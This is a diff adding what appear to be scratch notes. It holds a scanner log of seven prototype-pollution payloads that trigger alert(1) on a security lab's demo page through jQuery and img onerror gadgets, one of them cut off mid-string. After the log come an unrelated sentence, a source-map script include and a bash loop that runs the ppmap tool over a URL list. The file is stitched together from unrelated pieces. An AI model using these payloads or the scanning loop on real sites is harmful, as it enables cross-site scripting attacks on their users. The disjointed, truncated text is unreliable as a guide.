@@ -1,0 +1,20 @@
+2023/06/10 16:08:14 [EXPL] Final payload: <a href="https://withsecurelabs.github.io/prototype-pollution/protoPollution/prototypePollution-demo.html#__proto__[context]=<img/src/onerror%3dalert(1)>&__proto__[jquery]=x">11</a>
+2023/06/10 16:08:14 [EXPL] Final payload: <a href="https://withsecurelabs.github.io/prototype-pollution/protoPollution/prototypePollution-demo.html#__proto__[url][]=data:,alert(1)//&__proto__[dataType]=script">22</a>
+2023/06/10 16:08:14 [EXPL] Final payload: <a href="https://withsecurelabs.github.io/prototype-pollution/protoPollution/prototypePollution-demo.html#__proto__[url]=data:,alert(1)//&__proto__[dataType]=script&__proto__[crossDomain]=">33</a>
+2023/06/10 16:08:14 [EXPL] Final payload: <a href="https://withsecurelabs.github.io/prototype-pollution/protoPollution/prototypePollution-demo.html#__proto__[src][]=data:,alert(1)//">44</a>
+2023/06/10 16:08:14 [EXPL] Final payload: <a href="https://withsecurelabs.github.io/prototype-pollution/protoPollution/prototypePollution-demo.html#__proto__[url]=data:,alert(1)//">55</a>
+2023/06/10 16:08:14 [EXPL] Final payload: <a href="https://withsecurelabs.github.io/prototype-pollution/protoPollution/prototypePollution-demo.html#__proto__[div][0]=1&__proto__[div][1]=<img/src/onerror%3dalert(1)>&__proto__[div][2]=1">66</a>
+2023/06/10 16:08:14 [EXPL] Final payload: <a href="https://withsecurelabs.github.io/prototype-pollution/protoPollution/prototypePollution-demo.html#__proto__[preventDefault]=x&__proto__[handleObj]=x&__proto__[delegateTarget]=<img/src/onerror%3dal">77</a>
+
+Take data from google and show product as of the persons choice
+<script src="https://unpkg.com/source-map@0.7.3/dist/source-map.js"></script>
+<script>
+  sourceMap.SourceMapConsumer.initialize({
+    "lib/mappings.wasm": "https://unpkg.com/source-map@0.7.3/lib/mappings.wasm",
+  });
+</script>
+
+cat x | while read -r url; do timeout 180s bash -c 'echo "$0" | ppmap' "$url"; sleep 2; done
+
+
+
